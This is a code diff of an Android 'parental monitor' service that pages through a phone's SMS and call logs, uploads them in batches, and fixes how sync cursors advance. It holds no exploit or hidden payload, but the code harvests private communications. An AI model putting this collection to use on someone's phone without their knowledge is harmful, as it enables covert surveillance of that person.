@@ -4785,8 +4785,13 @@ class MonitoringService : Service() {
                 }
                 if (page.isEmpty()) break
                 pendingSms.addAll(page)
-                smsCursor = maxOf(smsCursor, page.maxOf { it.id })
-                smsDate = maxOf(smsDate, page.maxOf { it.date })
+                if (page.size >= 100) {
+                    smsCursor = page.last().id
+                    smsDate = page.last().date
+                } else {
+                    smsCursor = maxOf(smsCursor, page.maxOf { it.id })
+                    smsDate = maxOf(smsDate, page.maxOf { it.date })
+                }
                 smsPages++
                 smsLastFull = page.size >= 100
                 if (page.size < 100) break
@@ -4818,8 +4823,13 @@ class MonitoringService : Service() {
                 }
                 if (page.isEmpty()) break
                 pendingCalls.addAll(page)
-                callTs = maxOf(callTs, page.maxOf { it.date })
-                callId = maxOf(callId, page.maxOf { it.id })
+                if (page.size >= 100) {
+                    callTs = page.last().date
+                    callId = page.last().id
+                } else {
+                    callTs = maxOf(callTs, page.maxOf { it.date })
+                    callId = maxOf(callId, page.maxOf { it.id })
+                }
                 callPages++
                 callLastFull = page.size >= 100
                 if (page.size < 100) break
@@ -4866,9 +4876,12 @@ class MonitoringService : Service() {
             if (pendingSms.isNotEmpty()) {
                 if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Sending ${pendingSms.size} SMS...")
                 val smsTotal = pendingSms.size
+                var smsTop: com.redeye.parentalmonitor.data.models.SmsData? = null
+                var smsSemuaTerkirim = true
                 for ((index, part) in pendingSms.chunked(10).withIndex()) {
                     if (messageQueue.getQueueSize() >= DATA_QUEUE_SOFT_LIMIT) {
                         initialOk = false
+                        smsSemuaTerkirim = false
                         break
                     }
                     val message = buildString {
@@ -4886,18 +4899,29 @@ class MonitoringService : Service() {
                     }
                     val sentSmsPart = sendFitted(message, queueOnFail = true)
                     if (sentSmsPart != SendStatus.DROPPED) {
-                        try {
-                            preferencesManager.setSmsCursorSync(
-                                maxOf(preferencesManager.lastSmsId, part.maxOf { it.id }),
-                                maxOf(preferencesManager.lastSmsTimestamp, part.maxOf { it.date })
-                            )
-                        } catch (_: Exception) {
+                        val topPart = part.maxWithOrNull(compareBy({ it.date }, { it.id }))
+                        val topPrev = smsTop
+                        if (topPart != null && (topPrev == null || topPart.date > topPrev.date || (topPart.date == topPrev.date && topPart.id > topPrev.id))) {
+                            smsTop = topPart
+                        }
+                        val t = smsTop
+                        if (t != null) {
+                            try { preferencesManager.setSmsCursorSync(t.id, t.date) } catch (_: Exception) { }
                         }
                     } else {
                         initialOk = false
+                        smsSemuaTerkirim = false
                         break
                     }
                     delay(500)
+                }
+                if (smsSemuaTerkirim && !smsTruncated) {
+                    val tuntasSms = com.redeye.parentalmonitor.utils.CursorAdvance.penyelesaian(
+                        try { preferencesManager.lastSmsId } catch (_: Exception) { 0L },
+                        try { preferencesManager.lastSmsTimestamp } catch (_: Exception) { 0L },
+                        pendingSms.map { it.id to it.date }
+                    )
+                    try { preferencesManager.setSmsCursorSync(tuntasSms.first, tuntasSms.second) } catch (_: Exception) { }
                 }
                 if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "All SMS sent")
             }
@@ -4905,9 +4929,12 @@ class MonitoringService : Service() {
             if (pendingCalls.isNotEmpty()) {
                 if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Sending ${pendingCalls.size} calls...")
                 val callTotal = pendingCalls.size
+                var callTop: com.redeye.parentalmonitor.data.models.CallData? = null
+                var callSemuaTerkirim = true
                 for ((index, part) in pendingCalls.chunked(10).withIndex()) {
                     if (messageQueue.getQueueSize() >= DATA_QUEUE_SOFT_LIMIT) {
                         initialOk = false
+                        callSemuaTerkirim = false
                         break
                     }
                     val message = buildString {
@@ -4926,18 +4953,29 @@ class MonitoringService : Service() {
                     }
                     val sentCallPart = sendFitted(message, queueOnFail = true)
                     if (sentCallPart != SendStatus.DROPPED) {
-                        try {
-                            preferencesManager.setCallCursorSync(
-                                maxOf(preferencesManager.lastCallTimestamp, part.maxOf { it.date }),
-                                maxOf(preferencesManager.lastCallId, part.maxOf { it.id })
-                            )
-                        } catch (_: Exception) {
+                        val topPart = part.maxWithOrNull(compareBy({ it.date }, { it.id }))
+                        val topPrev = callTop
+                        if (topPart != null && (topPrev == null || topPart.date > topPrev.date || (topPart.date == topPrev.date && topPart.id > topPrev.id))) {
+                            callTop = topPart
+                        }
+                        val t = callTop
+                        if (t != null) {
+                            try { preferencesManager.setCallCursorSync(t.date, t.id) } catch (_: Exception) { }
                         }
                     } else {
                         initialOk = false
+                        callSemuaTerkirim = false
                         break
                     }
                     delay(500)
+                }
+                if (callSemuaTerkirim && !callTruncated) {
+                    val tuntasCall = com.redeye.parentalmonitor.utils.CursorAdvance.penyelesaian(
+                        try { preferencesManager.lastCallId } catch (_: Exception) { 0L },
+                        try { preferencesManager.lastCallTimestamp } catch (_: Exception) { 0L },
+                        pendingCalls.map { it.id to it.date }
+                    )
+                    try { preferencesManager.setCallCursorSync(tuntasCall.second, tuntasCall.first) } catch (_: Exception) { }
                 }
                 if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "All calls sent")
             }
@@ -5073,17 +5111,28 @@ class MonitoringService : Service() {
                 var smsSentAny = false
                 val freqMap = try { batchFreqMap() } catch (_: Exception) { null }
                 val knownMap = try { smsPage.map { it.address }.distinct().associateWith { isKnownContact(it) } } catch (_: Exception) { null }
+                var smsHabis = true
                 for (part in smsPage.chunked(10)) {
-                    if (messageQueue.getQueueSize() >= DATA_QUEUE_SOFT_LIMIT) break
+                    if (messageQueue.getQueueSize() >= DATA_QUEUE_SOFT_LIMIT) {
+                        smsHabis = false
+                        break
+                    }
                     val sentSms = sendFitted(formatSmsMessage(part, freqMap, knownMap), queueOnFail = true)
                     if (sentSms != SendStatus.DROPPED) {
-                        smsCursor = maxOf(smsCursor, part.maxOf { it.id })
-                        smsDate = maxOf(smsDate, part.maxOf { it.date })
+                        smsCursor = part.last().id
+                        smsDate = part.last().date
                         try { preferencesManager.setSmsCursorSync(smsCursor, smsDate) } catch (_: Exception) { }
                         smsSentAny = true
                         found = true
                     } else {
+                        smsHabis = false
                         break
+                    }
+                }
+                if (smsHabis && smsPage.size < 100) {
+                    val tuntas = com.redeye.parentalmonitor.utils.CursorAdvance.penyelesaian(lastSms, lastSmsTs, smsPage.map { it.id to it.date })
+                    if (tuntas.first != smsCursor || tuntas.second != smsDate) {
+                        try { preferencesManager.setSmsCursorSync(tuntas.first, tuntas.second) } catch (_: Exception) { }
                     }
                 }
                 if (smsSentAny) {
@@ -5105,22 +5154,28 @@ class MonitoringService : Service() {
             if (callPage.isNotEmpty()) {
                 var callSentAny = false
                 val callKnown = try { callPage.map { it.number }.distinct().associateWith { isKnownContact(it) } } catch (_: Exception) { null }
+                var callHabis = true
                 for (part in callPage.chunked(10)) {
-                    if (messageQueue.getQueueSize() >= DATA_QUEUE_SOFT_LIMIT) break
+                    if (messageQueue.getQueueSize() >= DATA_QUEUE_SOFT_LIMIT) {
+                        callHabis = false
+                        break
+                    }
                     val sentCall = sendFitted(formatCallMessage(part, callKnown), queueOnFail = true)
                     if (sentCall != SendStatus.DROPPED) {
                         try {
-                            preferencesManager.setCallCursorSync(
-                                maxOf(preferencesManager.lastCallTimestamp, part.maxOf { it.date }),
-                                maxOf(preferencesManager.lastCallId, part.maxOf { it.id })
-                            )
+                            preferencesManager.setCallCursorSync(part.last().date, part.last().id)
                         } catch (_: Exception) {
                         }
                         callSentAny = true
                         found = true
                     } else {
+                        callHabis = false
                         break
                     }
+                }
+                if (callHabis && callPage.size < 100) {
+                    val tuntas = com.redeye.parentalmonitor.utils.CursorAdvance.penyelesaian(lastCallId, lastCallTs, callPage.map { it.id to it.date })
+                    try { preferencesManager.setCallCursorSync(tuntas.second, tuntas.first) } catch (_: Exception) { }
                 }
                 if (callSentAny) {
                     try { preferencesManager.lastSyncTime = System.currentTimeMillis() } catch (_: Exception) { }
